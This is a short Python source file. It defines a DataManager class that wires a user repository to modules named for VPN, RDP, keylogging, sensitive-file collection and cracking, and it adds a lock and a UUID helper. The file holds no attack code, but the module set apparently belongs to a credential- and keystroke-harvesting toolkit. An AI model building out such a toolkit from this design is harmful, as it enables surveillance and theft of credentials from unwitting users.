import uuid
import asyncio
from dataManager.repository.userRepository import UserRepository
from modules.VpnModule import VpnModule
from modules.RdpModule import RdpModule
from modules.KeyloggerModule import KeyloggerModule
from modules.SensitiveFilesModule import SensitiveFilesModule
from modules.CrackModule import CrackModule
from dotenv import load_dotenv
load_dotenv()

class DataManager:
    def __init__(self):
        self.user_repository = UserRepository()
        self.vpn_module = VpnModule(self.user_repository)
        self.rdp_module = RdpModule(self.user_repository)
        self.keylogger_module = KeyloggerModule(self.user_repository)
        self.sensitive_files_module = SensitiveFilesModule(self.user_repository)
        self.crack_module = CrackModule(self.user_repository)
        self.lock = asyncio.Lock()
    
        
    def generate_uuid(self):
        return str(uuid.uuid4())